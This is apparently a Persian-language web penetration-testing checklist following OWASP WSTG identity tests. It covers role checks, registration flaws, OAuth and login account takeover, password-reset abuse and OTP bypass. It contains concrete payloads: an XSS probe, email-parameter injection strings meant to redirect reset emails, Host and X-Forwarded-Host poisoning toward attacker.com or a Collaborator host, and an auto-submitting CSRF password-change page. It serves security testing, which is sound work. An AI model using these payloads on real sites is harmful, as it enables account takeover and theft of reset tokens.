# Test Role Definitions
### WSTG-IDNT-01 


## اهداف تست نقش‌ها (Role Testing Objectives):

### شناسایی و مستندسازی نقش‌ها:
##### تحلیل نقش‌های استفاده‌شده در برنامه مانند کاربر معمولی، ادمین و نقش‌های دیگر.
##### استخراج محدودیت‌ها و سطح دسترسی تعریف‌شده برای هر نقش.

### تلاش برای تغییر یا سوئیچ نقش به صورت غیرمجاز:
#####  بررسی امکان تغییر نقش کاربر معمولی به ادمین یا نقش‌های دیگر.
##### شناسایی ضعف‌های امنیتی در مدیریت نقش‌ها.

### بررسی دقیق محدودیت نقش‌ها:
##### تلاش برای دور زدن محدودیت‌های تعریف‌شده برای هر نقش.
##### اطمینان از اینکه کاربران در نقش خود به داده‌ها یا عملیات مجاز تعریف‌شده محدود شده‌ان

### تلاش برای انجام عملیات کاربران دیگر:
##### بررسی امکان انجام عملیات ادمین توسط کاربر معمولی.
##### تحلیل دقیق و تست رفتار برنامه هنگام تغییر نقش کاربر از ادمین به معمولی و اطمینان از حذف دسترسی‌های اضافه.

### بررسی تغییرات نقش پس از تنزل:
##### اطمینان از اینکه در صورت تغییر نقش کاربر (مثلاً از ادمین به معمولی)، دسترسی به عملیات یا داده‌های مربوط به نقش ادمین کاملاً قطع می‌شود.

### مراجعه به بخش‌های مستندات :
#####  بررسی سناریوهای مربوط به دعوت کاربران، مدیریت اعضا، و تغییر دسترسی‌ها.

### تحلیل متغیرهای مربوط به نقش در کوکی‌ها:
#####  بررسی متغیرهایی مانند role=admin در کوکی و تلاش برای تغییر آن.

### فازینگ نقش‌ها:
##### انجام فازینگ بر روی نقش‌های ممکن برای شناسایی ضعف‌های احتمالی.

### تست متغیرهای مربوط به نقش در درخواست‌ها:
##### بررسی متغیرهای نقش در Body یا URL درخواست‌ها و تلاش برای تغییر آن‌ها.

 ### بررسی فایل‌ها یا داده‌های محدود به ادمین:

##### تست دسترسی به فایل‌ها، دایرکتوری‌ها، یا داده‌هایی که تنها ادمین باید دسترسی داشته باشد، از طریق نقش‌های دیگر.



--------------------------


# Test User Registration Process

### WSTG-IDNT-02

## اهداف تست ثبت‌نام (Register Testing Objectives):

### بررسی نظم‌دهی و فرآیند ثبت‌نام:
##### تحلیل ساختار و منطق سیستم ثبت‌نام.
##### اطمینان از رعایت اصول امنیتی در مراحل ثبت‌نام.

##### اعتبارسنجی فرآیند ثبت‌نام:
##### شناسایی نقاط ضعف در اعتبارسنجی داده‌ها و تایید هویت کاربران.

### نحوه‌ی تست:


#### تستDuplicate Registration (ثبت‌نام تکراری):
##### تست این‌که آیا سیستم از ثبت‌نام مجدد با اطلاعات مشابه (مانند ایمیل یا شماره تماس) جلوگیری می‌کند.
##### بررسی روش‌های جلوگیری از سوءاستفاده توسط کاربران برای ایجاد چندین حساب کاربری مشابه.

#### تستOverwrite Existing User (تصاحب حساب موجود):
##### آزمایش اینکه آیا امکان ثبت‌نام با اطلاعات کاربری موجود وجود دارد.
##### بررسی سناریوی تصاحب حساب کاربری (Account Takeover) با تغییر جزئی اطلاعات مانند تغییر نام کاربری یا ایمیل.

#### تستUsername Uniqueness (منحصر به‌فرد بودن نام کاربری):
#####  بررسی اینکه آیا سیستم نام کاربری یکتا را برای هر کاربر الزام می‌کند.
##### جلوگیری از تخصیص یک نام کاربری مشابه به چند کاربر.

#### تستWeak Password Policy (سیاست ضعیف برای گذرواژه):
##### بررسی اینکه آیا سیستم از رمز عبورهای ساده یا ضعیف (مانند "123456" یا "password") جلوگیری می‌کند.
##### تست شرایط اجباری برای رمزهای عبور مانند حداقل طول، ترکیب حروف و اعداد، یا وجود کاراکترهای خاص.

 #### تستInsufficient Email Verification Process (فرآیند تأیید ایمیل ناکافی):
#####  بررسی اینکه آیا ایمیل کاربران قبل از فعال‌سازی حساب تأیید می‌شود.
#####  ارزیابی اینکه آیا لینک‌های تأیید ایمیل دارای زمان انقضا هستند یا می‌توانند بازاستفاده شوند.

 #### تستWeak Registration Implementation or Allows Disposable Email Addresses (پیاده‌سازی ضعیف یا اجازه به ایمیل‌های موقت):
#####  بررسی اینکه آیا سیستم از ایمیل‌های موقت (مثل ایمیل‌های خدماتی یک‌بار مصرف) جلوگیری می‌کند.
#####  تست روش‌های مدیریت اعتبارسنجی ایمیل برای جلوگیری از سوءاستفاده.

#### تستFuzz After User Creation to Check If Any Folder Has Been Overwritten or Created with Your Profile Name (فازینگ پس از ایجاد کاربر):
##### بررسی اینکه آیا سیستم در حین ایجاد حساب، فولدرها یا مسیرهای خاصی ایجاد می‌کند.
##### تست این موضوع که آیا این فولدرها می‌توانند توسط کاربر بازنویسی شوند یا دسترسی غیرمجاز به آن‌ها ممکن است.

#### تست Add Only Spaces in Password (استفاده از فضاهای خالی به عنوان رمز عبور):
##### تست اینکه آیا سیستم از رمز عبورهایی که فقط شامل کاراکترهای فضای خالی (Spaces) هستند جلوگیری می‌کند.
##### این نوع تست برای شناسایی ضعف در سیاست‌های گذرواژه و الگوریتم‌های رمزنگاری اهمیت دارد.


#### بررسی دسترسی به ثبت‌نام:
##### آیا هر کسی می‌تواند برای ثبت‌نام اقدام کند؟
##### محدودیت‌هایی برای جلوگیری از سوءاستفاده‌های سیستمی وجود دارد؟

#### تایید ثبت‌نام:
######  آیا ثبت‌نام‌ها توسط انسان تایید می‌شوند یا به صورت خودکار؟

#### تکرار ثبت‌نام:
###### آیا یک فرد می‌تواند چند بار با اطلاعات مشابه ثبت‌نام کند؟
###### آیا محدودیت‌هایی برای جلوگیری از سوءاستفاده وجود دارد؟

#### ثبت‌نام با نقش‌ها یا مجوزهای مختلف:
##### آیا کاربران می‌توانند برای نقش‌ها یا مجوزهای خاص ثبت‌نام کنند؟
#####  نحوه‌ی مدیریت درخواست نقش‌ها چگونه است؟

 #### مدارک لازم برای ثبت‌نام:
##### آیا مدارک خاصی برای ثبت‌نام موفق نیاز است؟
##### بررسی صحت و دقت اطلاعات ارائه‌شده.

#### تایید هویت:
##### آیا هویت‌های ثبت‌شده تایید می‌شوند؟
##### روش‌های تایید هویت چه هستند؟

#### داده‌های جعلی در ثبت‌نام:
##### آیا می‌توان فیلدهای ثبت‌نام را با داده‌های جعلی پر کرد؟

#### اعتبارسنجی و تست فرآیند ثبت‌نام:

##### اطلاعات واردشده برای ثبت‌نام:
##### آیا داده‌هایی که برای ثبت‌نام استفاده می‌شوند قابل جعل هستند؟
##### بررسی صحت داده‌های ارسالی در مراحل مختلف.

#### داده‌ها در حین ثبت‌نام:
 ##### آیا داده‌های ارسال‌شده در حین ثبت‌نام قبل از ذخیره‌سازی قابل دستکاری هستند؟

#### ایجاد سناریوهای مختلف تست:
#####  براساس سوالات بالا سناریوهایی برای شناسایی آسیب‌پذیری‌ها طراحی شود.
#####  بررسی واکنش سیستم در مواجهه با رفتارهای غیرمنتظره.

#### دستکاری پاسخ یا وضعیت HTTP (Status Manipulation):

##### هدف: اطمینان از اینکه تغییر پاسخ HTTP مانند تغییر 403 به 200 منجر به سوءاستفاده نمی‌شود.
#### روش تست:
##### در درخواست‌هایی که پاسخ خطا دارند (مثل 403)، با ابزارهایی مانند Burp Suite یا Postman، وضعیت HTTP را به 200 تغییر دهید و تأثیر آن را بررسی کنید.

#### پیمایش مستقیم فایل‌ها پس از تأیید ایمیل:

##### هدف: اطمینان از امنیت فایل‌هایی که پس از تأیید ایمیل ارائه می‌شوند.
#### روش تست:
##### لینک فایل‌های ارسال‌شده پس از تأیید ایمیل را مستقیماً باز کنید و تلاش کنید بدون تأیید ایمیل به آن‌ها دسترسی پیدا کنید.

##### استفاده از ایمیل مشابه برای دوباره ثبت‌نام (Duplicate Email Test):

#### هدف: شناسایی افشای اطلاعات کاربران موجود.
#### روش تست:
##### ابتدا با ایمیلی مانند abc@gmail.com ثبت‌نام کنید.
#####  سپس در یک مرورگر دیگر همان ایمیل را وارد کنید با یک رمز عبور تصادفی.
##### پاسخ سرور را بررسی کنید و ببینید آیا اطلاعاتی از حساب موجود افشا می‌شود.

#### استفاده از تنوع حروف کوچک و بزرگ در ایمیل (Email Case Sensitivity):

##### هدف: جلوگیری از ثبت ایمیل‌های مشابه به دلیل حساسیت به حروف بزرگ و کوچک.
##### روش تست:
#####  با ایمیلی مثل abc@gmail.com حساب بسازید. سپس با Abc@gmail.com مجدداً تلاش به ثبت‌نام کنید.
#####  بررسی کنید که آیا سیستم به اشتباه حساب جدیدی ایجاد می‌کند.

#### حملات DoS در فرم ثبت‌نام:

#### هدف: بررسی عملکرد سرور در برابر ورودی‌های غیرطبیعی.
#### روش تست:
#####  در فیلد رمز عبور یک رشته بلند (مثلاً 500 کاراکتر) وارد کنید.
#####  بررسی کنید آیا سرور خطای 500 (Internal Server Error) برمی‌گرداند.

#### تزریق XSS در فرآیند ثبت‌نام:

#### هدف: شناسایی آسیب‌پذیری‌های XSS در فیلدهای حساس.
#### روش تست:
##### در فیلدهای نام کاربری یا ایمیل، ورودی‌هایی مثل <img src=x onerror=alert(1)> را وارد کنید.
##### بررسی کنید آیا کد اجرا می‌شود یا به درستی فیلتر می‌گردد.

#### نبود محدودیت تعداد درخواست‌ها (Rate Limiting):

##### هدف: جلوگیری از حملات Brute Force یا ثبت‌نام‌های انبوه.
##### روش تست:
##### با ابزارهایی مثل Burp Intruder، تعداد زیادی درخواست ثبت‌نام ارسال کنید و بررسی کنید آیا سیستم این تلاش‌ها را محدود می‌کند.

#### کد OTP پیش‌فرض:

#### هدف: شناسایی استفاده از کدهای OTP قابل پیش‌بینی.
##### روش تست:
#####  بررسی کنید آیا کدهای OTP مانند 123456، 000000 یا 111111 به عنوان مقادیر پیش‌فرض استفاده می‌شوند.

#### دسترسی مستقیم به Endpoint‌ها (Direct Endpoint Access):

#### هدف: اطمینان از اینکه Endpoint‌های حساس بدون احراز هویت قابل دسترسی نیستند.
#### روش تست:
##### یک درخواست معتبر برای تأیید OTP ارسال کنید.
##### سپس تلاش کنید همان Endpoint را بدون وارد کردن OTP یا احراز هویت دسترسی بگیرید.

#### استفاده مجدد از توکن‌ها (Token Reuse):

#### هدف: شناسایی امکان سوءاستفاده از توکن‌های قبلی.
##### روش تست:
##### پس از استفاده از یک کد OTP، مجدداً همان کد را ارسال کنید و بررسی کنید آیا قابل استفاده است یا خیر.

#### استفاده از توکن‌های منقضی‌نشده (Unused Token Utilization):

##### هدف: بررسی عملکرد سیستم در مدیریت انقضای توکن‌ها.
##### روش تست:
##### یک توکن دریافت کنید، اما آن را بلافاصله استفاده نکنید. سپس پس از گذشت مدت زمان مشخص بررسی کنید آیا هنوز معتبر است یا خیر.

#### بهره‌برداری از لینک تأیید ایمیل:

#### هدف: شناسایی آسیب‌پذیری در لینک‌های تأیید ایمیل.
##### روش تست:
##### لینک تأیید ایمیل را بررسی کنید. تلاش کنید مقدار ایمیل را در لینک تغییر دهید و تأثیر آن را بررسی کنید.

##### افشای کد OTP در پاسخ (Token Exposure):

#### هدف: بررسی افشای اطلاعات حساس در پاسخ‌های سرور.
##### روش تست:
##### پاسخ سرور در هنگام ارسال کد OTP را بررسی کنید و اطمینان حاصل کنید که کد در پاسخ نمایش داده نمی‌شود.

#### استفاده از نسخه‌های قدیمی (Utilizing Older Version):

#### هدف: بررسی امکان سوءاستفاده از نسخه‌های قدیمی سیستم.
#### روش تست:
##### تلاش کنید از Endpoint‌ها یا روش‌های قدیمی‌تر استفاده کنید و عملکرد آن‌ها را ارزیابی کنید.

#### حمله Brute Force:

#### هدف: اطمینان از مقاومت سیستم در برابر حملات Brute Force.
##### روش تست:
##### با ابزارهایی مثل Hydra یا Burp Intruder، حمله Brute Force را برای فیلدهای حساس انجام دهید.

#### نشت توکن بازنشانی رمز از طریق Referrer:

#### هدف: بررسی نشت توکن بازنشانی رمز از طریق هدر Referrer.
#### روش تست:
##### هنگامی که لینک بازنشانی رمز کلیک می‌شود، هدر Referrer را بررسی کنید و اطمینان حاصل کنید که توکن در آن نمایش داده نمی‌شود.



#### بررسی Username Enumeration:
##### بررسی کنید که آیا می‌توان وجود یک نام کاربری را با استفاده از پیام‌های خطا یا تفاوت در زمان پاسخ تشخیص داد. این مشکل می‌تواند به مهاجم کمک کند تا کاربران موجود را شناسایی کند.

#### بررسی Resilience to Password Guessing:
##### مطمئن شوید که مکانیزم‌هایی مانند محدودیت تعداد تلاش‌ها یا قفل حساب وجود دارد تا جلوی حملات حدس زدن رمز عبور (Brute Force) گرفته شود.

#### بررسیAccount Recovery Function:
##### عملکرد بازیابی حساب بررسی شود. اطمینان حاصل کنید که فرآیند امن است و امکان سوءاستفاده یا دستیابی غیرمجاز به حساب‌ها وجود ندارد.

#### بررسی"Remember Me" Function:
##### این عملکرد را از نظر امنیتی بررسی کنید تا اطمینان یابید که از توکن‌های امن و منقضی شونده برای حفظ ورود کاربران استفاده می‌شود.

#### بررسی Impersonation Function:
##### در مواردی که عملکردی برای ورود به حساب کاربران دیگر وجود دارد (مانند عملکرد مدیریت یا پشتیبانی)، بررسی شود که این عملکرد قابل سوءاستفاده نباشد.

#### بررسی Unsafe Distribution of Credentials:
##### بررسی کنید که اعتبارنامه‌ها (مانند رمز عبور یا لینک تأیید) به‌صورت ایمن ارسال شوند، مثلاً از طریق HTTPS یا رمزگذاری شده.

#### بررسی Fail-Open Conditions:
##### اطمینان حاصل کنید که در صورت بروز خطا در سیستم (مانند خرابی سرور)، فرآیند احراز هویت به‌صورت ناامن عمل نکند و دسترسی ناخواسته فراهم نشود.

#### بررسی Multi-Stage Mechanisms:
##### در مواردی که احراز هویت چند مرحله‌ای وجود دارد (مانند OTP یا ایمیل تأیید)، بررسی کنید که مهاجم نتواند مراحل را دور بزند.

#### بررسی SQL Injections:
##### ورودی‌های مربوط به احراز هویت را از نظر آسیب‌پذیری SQL Injection بررسی کنید. این نوع حمله می‌تواند منجر به دسترسی غیرمجاز شود.

#### بررسی Auto-Complete Testing:
##### اطمینان حاصل کنید که فیلدهای مربوط به ورود یا تغییر اطلاعات حساس (مانند رمز عبور) دارای ویژگی autocomplete="off" باشند تا از ذخیره اطلاعات حساس در مرورگر جلوگیری شود.

#### بررسی Lack of Password Confirmation on Change Email, Password, or 2FA:
##### بررسی کنید که هنگام تغییر ایمیل، رمز عبور یا تنظیمات 2FA نیاز به تأیید رمز عبور وجود داشته باشد.

#### بررسی Weak Login Function Over HTTP and HTTPS if Both Are Available:
##### ورود به حساب فقط باید از طریق HTTPS انجام شود. در صورت امکان دسترسی به نسخه HTTP، حملات Man-In-The-Middle ممکن است انجام شوند.

#### بررسی User Account Lockout Mechanism on Brute Force Attack:
##### بررسی کنید که پس از تعداد مشخصی تلاش ناموفق برای ورود، حساب قفل شود تا از حملات Brute Force جلوگیری شود.

#### بررسی Check for Password Wordlist (CEWL and Burp-GoldenNuggets):
##### لیست‌های رایج رمز عبور را تست کنید تا ببینید آیا کاربران می‌توانند از رمزهای عبور ضعیف استفاده کنند.

#### بررسی Test OAuth Login Functionality for Open Redirection:
##### بررسی کنید که آیا در فرآیند ورود با OAuth، مهاجم می‌تواند از آسیب‌پذیری Open Redirect سوءاستفاده کند.

#### بررسی Test Response Tampering in SAML Authentication:
##### فرآیند احراز هویت SAML را از نظر امکان تغییر در پاسخ‌ها بررسی کنید، مانند دستکاری توکن یا امضای دیجیتال.

#### بررسی In OTP Check Guessable Codes and Race Conditions:
##### در سیستم‌های OTP بررسی کنید که آیا کدها قابل حدس زدن هستند یا شرایط رقابت (Race Condition) وجود دارد.

#### بررسی If JWT, Check Common Flaws:
##### در احراز هویت مبتنی بر JWT (JSON Web Token)، مشکلاتی مانند امضای نامعتبر، عدم انقضا یا استفاده از الگوریتم‌های ضعیف را بررسی کنید.

#### بررسی Browser Cache Weakness (Eg. Pragma, Expires, Max-Age):
##### اطمینان حاصل کنید که صفحات حساس (مانند داشبورد یا اطلاعات شخصی) در مرورگر کش نشوند یا با استفاده از هدرهایی مانند Pragma، Expires و Cache-Control به‌درستی مدیریت شوند.






----------------------------


# Authentication & Register & Login & OAuth

### سناریو 1:
#### زمانی که می‌خواهی وارد حساب (login) یا ثبت‌نام (signup) کنی:

##### ابتدا ایمیل وارد می‌شود (ایمیل قربانی).
#### سپس جایی که ریدایرکت (302) می‌شود، آدرس صفحه داشبورد را در هدر location بگذار. شاید این روش باعث شود که نیازی به وارد کردن OTP یا تأیید هویت چندعاملی نباشد.

### سناریو 2:
#### در بحث ثبت‌نام با استفاده از OAuth گوگل:

##### بیا URL گوگل را به‌دقت بررسی کن. پارامترهایی مثل callback را تغییر داده و آدرس کالابرایتور Burp Suite را بگذار.
##### پارامترها را یک به یک حذف و تست کن. پس از ورود به مرحله انتخاب حساب، ممکن است توکنی به کالابرایتور ارسال شود.

### سناریو 3:
##### ممکن است ایمیلی مانند test@company.com را برای ثبت‌نام استفاده کنی و بتوانی به‌گونه‌ای OTP را دور بزنی، یعنی دیگر نیاز به وارد کردن کد OTP نباشد.

### سناریو 4:
#### زمانی که در URL صفحه ورود یا ثبت‌نام، پارامتری مانند redirect وجود دارد:

##### مقدار این پارامتر را به آدرس سایت هکر تغییر بده.
##### بعد از ورود ممکن است به‌طور خودکار به سایت هکر هدایت شوی.

### سناریو 5:
##### اگر بتوان بدون تأیید ایمیل (بدون OTP یا کد تأیید)، ایمیل ثبت‌شده در حساب کاربری را تغییر داد، امکان سوءاستفاده وجود دارد. این یعنی یک هکر می‌تواند ایمیل قربانی را تغییر داده و با آن حساب بسازد.

### سناریو 6:
#### هنگام ورود به حساب:

##### اگر کد OTP اشتباه وارد شود و در پاسخ خطا برگردد، بدنه پاسخ خطا را با بدنه پاسخ صحیح جایگزین کن.

### سناریو 7:
#### هنگام ورود اگر رمز عبور صحیح باشد و پاسخ 302 بدهد:

##### رمز اشتباه وارد کن و پاسخ 302 را جایگزین پاسخ رمز اشتباه کن. ممکن است بتوانی بدون رمز عبور وارد پنل کاربری شوی.

### سناریو 8:
##### در سایت‌هایی که امکان ثبت‌نام با OAuth وجود دارد:

##### دسترسی نمایش ایمیل را غیرفعال کن و سپس به سایت هدف منتقل شو. ممکن است سایت از تو ایمیل بخواهد. در این حالت، ایمیل قربانی را وارد کن. احتمال دارد بدون تأیید هویت، به حساب قربانی دسترسی پیدا کنی.

### سناریو 9:
##### زمانی که در هنگام ورود کد به ایمیل فرستاده می‌شود:

##### کوکی مربوط به refresh را حذف کن و URL را به مسیر مربوط به پروفایل یا داشبورد تغییر بده. ممکن است بدون وارد کردن کد، دسترسی پیدا کنی.

### سناریو 10:
#### اگر بخشی وجود دارد که می‌توانی ایمیل دعوت‌نامه ارسال کنی:

##### در فیلد آدرس سایت مخرب مثل https://evil.com قرار بده. اگر نپذیرفت، فرمتی مثل [www.evil.com](http://www.evil.com) را امتحان کن.
##### ممکن است این لینک در ایمیل قربانی بازتاب شود.

### سناریو 11:
#### در صورتی که امکان ثبت‌نام بدون احراز هویت وجود داشته باشد و نتوان بعداً ایمیل را تغییر داد:

##### با استفاده از شرایط رقابت (Race Condition)، چندین درخواست برای تغییر ایمیل و ارسال دعوت‌نامه به صورت همزمان ارسال کن. ممکن است فرآیند دعوت تکمیل شود در حالی که ایمیل تغییر کرده باشد.



### سناریو 12:

#### مشکل نرمال‌سازی یونیکد

#### حساب قربانی

	victim@gmail.com

#### ساخت حساب با یونیکد

### مثال: 
### 	vićtim@gmail.com

### لیست کاراکترهای یونیکد:

	https://lnkd.in/gYafEt6i


### سناریو 13:
### مشکل مجوز:

#### تغییر ایمیل حساب A و وارد کردن ایمیل B
#### ایمیل تایید را در حساب B بررسی کنید.
### ایمیل تایید را از حساب C باز کنید.
#### حساب C تسخیر شده است.


### سناریو 14:

#### استفاده مجدد از توکن بازنشانی

#### اگر هدف به شما اجازه دهد از لینک بازنشانی استفاده مجدد کنید، برای لینک‌های بازنشانی بیشتر با استفاده از ابزارهایی مانند gau، wayback یاurlscan.io جستجو کنید.

### سناریو 15:

#### با استفاده از فرم ثبت‌نام عادی به عنوان هکر ثبت‌نام کنید، اما هکر هیچ لینکی برای تایید دریافت نمی‌کند.

#### سپس اگر قربانی با استفاده از OAuth ثبت‌نام کند، تاییدیه را دور بزنید. حالا هکر می‌تواند به حساب قربانی وارد شود بدون اینکه لینک تاییدیه داشته باشد و با رمز عبوری که هنگام ثبت‌نام وارد کرده است، وارد شود.


### سناریو 16:
#### تنظیمات نادرست CORS برای تسخیر حساب : 

#### بیاین API رو بررسی کنید، آیا هر نقطه پایانی (endpoint) دسترسی به توکن‌ها، جلسه‌ها، رمزها یا اثرانگشت‌ها دارد؟
#### اگر بله، بررسی کنید که آیا تنظیمات CORS به شما اجازه می‌دهد تا داده‌ها را از هدف بازیابی کنید؟
#### یک Payload بسازید تا داده‌ها را بازیابی کنید و هدرها را جایگزین کنید !


### حمله CSRF برای تسخیر حساب :‌

#### اگر تغییرات پروفایل در احراز هویت مبتنی بر کوکی هیچ توکنی تولید نمی‌کند،
#### حساب A را باز کنید، ایمیلی که خودتان دارید را وارد کنید و ذخیره کنید. درخواست را اینترسپت کنید و یک POC CSRF تولید کنید.
#### اگر احراز هویت کاملاً مبتنی بر کوکی باشد، نیازی به تغییر هیچ چیزی ندارید، فقط فایل CSRF را برای قربانی ارسال کنید.
#### اگر به UUID/UserID یا توکن منحصربه‌فرد نیاز دارد، انجام این کار سخت‌تر می‌شود، اما این به معنای امن بودن نیست، فقط شروع به آزمایش با هدف کنید.
#### راهنمایی: صفحه بازنشانی رمز عبور بارها کمک می‌کند تا UUID/GUID و UserID را پیدا کنید.


### سناریو 16:
#### تزریق هدر Host
#### در این مورد چهار روش برای انجام این کار وجود دارد:
#### بر روی "بازنشانی رمز عبور" کلیک کنید و هدر Host را تغییر دهید.
#### یا هدر پروکسی را تغییر دهید. مثلاً: X-Forwarded-For: attacker.com
#### یا هدرهای Host، Referrer، و Origin را همزمان تغییر دهید به attacker.com.



### سناریو 16:

#### دستکاری پاسخ

#### دستکاری کد * به 200 OK
#### دستکاری کد و بدنه * به 200 OK بدنه * به {"success":true} یا {}



### سناریو 17:


#### تسخیر حساب با کاراکترهای حروف بزرگ (Uppercase)

#### مراحل انجام:

#### از یک ایمیل موجود برای ثبت‌نام استفاده کنید.

#### ایمیل:
    existing@email.com
#### رمز عبور:
    Randompassword

 #### خطای زیر را دریافت می‌کنید:
    "User already exists."

#### سپس همان ایمیل را با کاراکترهای حروف بزرگ امتحان کنید.

 ####  ایمیل:
    existing@email.COM
####  رمز عبور:
    Randompassword

 #### در این حالت، به داشبورد حساب از قبل موجود هدایت خواهید شد.




### سناریو 18:



#### Account Takeover Through Email Replacing when Registering Account (testing/abuse email filter):
	email@email.com,victim@hack.secry
	email@email“,”victim@hack.secry
	email@email.com:victim@hack.secry
	email@email.com%0d%0avictim@hack.secry
	%0d%0avictim@hack.secry
	%0avictim@hack.secry
	victim@hack.secry%0d%0a
	victim@hack.secry%0a
	victim@hack.secry%0d
	victim@hack.secry%00
	victim@hack.secry{{}}

### سناریو 19:


#### دو حساب کاربری جداگانه ایجاد کنید:

    حساب 1 (حساب شما):
    ایمیل: attacker@example.com
    رمز عبور: Password1
    حساب 2 (هدف):
    ایمیل: victim@example.com
    رمز عبور: Password2

#### با حساب اول (attacker@example.com) وارد سیستم شوید و درخواست تغییر رمز عبور بدهید.

#### ایمیلی برای تغییر رمز عبور به آدرس شما ارسال می‌شود. لینک موجود در ایمیل را باز کنید.

#### در صفحه تغییر رمز عبور، یک رمز عبور جدید وارد کنید و درخواست خود را ارسال کنید.
	به عنوان مثال:
	رمز عبور جدید: NewPassword1

#### حالا از Burp Suite یا ابزار مشابه برای رهگیری این درخواست استفاده کنید. در بدنه یا هدر درخواست، مقدار ایمیل (attacker@example.com) را پیدا کنید.

#### مقدار ایمیل را به ایمیل قربانی (victim@example.com) تغییر دهید و درخواست را ارسال کنید.

#### اگر آسیب‌پذیری وجود داشته باشد، رمز عبور حساب قربانی (victim@example.com) به همان رمز عبور جدیدی که شما تعیین کردید (مثلاً NewPassword1) تغییر می‌کند.

#### حالا می‌توانید با استفاده از ایمیل قربانی و رمز عبور جدید به حساب قربانی وارد شوید.




------------------------------------

# Forget Password 

### فراموشی رمز عبور





### سناریو 1:
#### دو حساب کاربری بساز و لینک‌های فراموشی رمز عبور آن‌ها را با هم مقایسه کن. یا بسته‌های مربوطه را بررسی کن. ممکن است بسته مربوط به فراموشی رمز حساب اول برابر باشد با مثلاً مقدار 322 و لینک حساب دوم پارامترش 323 باشد. حالا می‌توانی مقدار 322 که برای حساب اول است را به 323 تغییر دهی. در این حالت ممکن است لینک بازنشانی رمز حساب دوم به ایمیل تو ارسال شود.


### سناریو 2:
#### درخواست فراموشی رمز عبور را که می‌خواهی ارسال کنی، بگیر و با مقدار HOST آن بازی کن. شاید با تغییر این مقدار، دامنه لینک ارسالی به ایمیل قربانی تغییر کند. از این روش استفاده کن:

	Host: abcd.burpcollaborator.com:login.redacted.com
#### هدرهایی مثل X-Forwarded-Host را هم تست کن.


### سناریو 3:

#### در بخش فراموشی رمز عبور، ایمیل قربانی را وارد کن. سپس درخواست را در Burp Suite بگیر که به این شکل است:

	{
     "email": "victim@gmail.com"
	}

#### حالا این تغییر را بده:

	{
	"email": [
		"victim@gmail.com",
		"hacker@gmail.com"
	]
	}

#### OR  

	POST /passwordReset

	[…]

	email=victim@yahoo.com&email=hacker@yahoo.com

 # OR 

 	POST /Passwordreset
	[…]
	email=victim@mail.com,hacker@mail.com
# OR 

	POST /Passwordreset
	[…]
	email=victim@mail.com%20hacker@mail.com
# OR

	POST /Passwordreset
	[…]
	email=victim@mail.com|hacker@mail.com
# OR 

	POST /Passwordreset
	[…]
	email=victim@mail.com%00hacker@mail.com

# OR 

	POST /reset
	[…]
	email=victim@mail.com%0a%0dcc:hacker@secry.me
 

#### ممکنه که ایمیل بازنشانی رمز عبور برای هر دو ایمیل ارسال می‌شود.


### سناریو 4:

##### فراموشی رمز عبور را بزن، ایمیل خودت را وارد کن، سپس لینک بازنشانی رمز عبور به ایمیلت ارسال می‌شود. لینک را باز کن و رمز عبور جدیدی ثبت کن. حالا درخواست سمت سرور را بگیر و ایمیل را تغییر بده.


### سناریو 5:

#### در جایی که عملیات فراموشی رمز عبور انجام می‌شود، ممکن است درخواست شامل پارامترهای old_password و new_password باشد. پارامتر old_password را حذف کن و درخواست را ارسال کن. اگر درخواست موفق بود، بررسی کن که آیا درخواست ساده است؟ اگر ساده بود، کوکی را نیز بررسی کن. اگر پارامتر مهمی وجود نداشت یا مقدار None بود، از CSRF برای تسلط بر حساب استفاده کن.

##### اکسپلویت CSRF برای فراموشی رمز عبور:
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>Document</title>

    </head>
    <body>
 
    <form action="https://secure.redacted.com/account/changePassword" method="POST">
      <input type="hidden" name="oldPassword" value="" />
      <input type="hidden" name="newPassword1" value="testnew" />
      <input type="hidden" name="newPassword2" value="testnew" />
      <input type="hidden" name="submitChanges" value="Submit&#32;Changes" />
      <input type="submit" value="Submit request" style="opacity: 0;" />
    </form>

    <script>
      document.querySelector("form").submit()
    </script>
    </body>
    </html>


### سناریو 6:

#### در جایی که درخواست فراموشی رمز عبور ارسال می‌شود، هدر زیر را اضافه کن:

	 X-Forwarded-Host: attacker.com

#### حالا ایمیل قربانی را بررسی کن تا ببینی لینک ارسالی چگونه است:

##### درخواست عادی:
	https://www.sastotickets.com/customer/reset-password/fug6GpGiw0bVFDF7Dk4AW×NLonIFt6Bo/MjWiwkX08t
##### درخواست مسموم:
	https://www.attacker.com/customer/reset-password/fug6GpGiw0bVFDF7Dk4AW×NLonIFt6Bo/MjWiwkX08t

### سناریو 7 (ادامه):

##### در جایی که فراموشی رمز عبور انجام می‌دهی، درخواست را بررسی کن. ممکن است یک URL در درخواست وجود داشته باشد. اگر آن را تغییر دهی، ایمیل ارسال شده ممکن است حاوی URL تغییر یافته باشد. به عنوان مثال، می‌توانی جمله "لطفاً روی این لینک کلیک کنید" را به ایمیل اضافه کنی و برای URL هم آدرس Burp را بدهی تا این سناریو رخ دهد:
وقتی قربانی ایمیل را باز می‌کند، URL همراه با توکن به Collaborator ارسال می‌شود. سپس هکر توکن را برداشته و URL صحیح را ساخته و بازنشانی رمز را انجام می‌دهد.


### سناریو  8
##### رمز عبور را بازنشانی کن، سپس با استفاده از لینک ارسال شده به ایمیل، رمز عبور جدیدی تنظیم کن. حالا دوباره از همان لینک استفاده کن و بررسی کن که آیا می‌توان دوباره با آن رمز عبور را بازنشانی کرد یا خیر؟


-----------------------------------------

# OTP BYPASS

### سناریو 1 : 

#### بعد از ورود به حساب، به صورت دستی به داشبورد برو و OTP را وارد نکن.
#### به عنوان مثال، به جای وارد کردن OTP، مستقیماً به بخش تغییر رمز عبور برو.

### سناریو 2 : 

#### اگر در جایی که OTP اشتباه وارد می‌کنی، ممکن است بعد از آن یک Redirect انجام شود.
#### در Response مربوط به درخواست Redirect، قسمت Location را بررسی کن و URL داشبورد را وارد کن.
#### ممکن است بدون نیاز به وارد کردن OTP به صفحه داشبورد منتقل شوی.

### سناریو 3:

#### در بحث دور زدن OTP، وقتی درخواست OTP ارسال می‌شود، ممکن است کد OTP در Response برگردد.
#### حتماً Response را بررسی کن.

### سناریو 4:

#### زمانی که می‌خواهی وارد حساب شوی و کد OTP اشتباه وارد می‌کنی و Response به شما خطا برمی‌گرداند،
#### حالا Body مربوط به Response خطا را پاک کن و با Body Response صحیح جایگزین کن.

### سناریو 12:

#### در زمان ثبت‌نام، وقتی درخواست ارسال کد OTP می‌کنی و کد اشتباه وارد می‌کنی،
#### در Source Code صفحه جستجو کن. ممکن است کد OTP به صورت DOM داخل تگ یا Attribute‌هایی مثل data-code قرار گرفته باشد.

### سناریو 38:

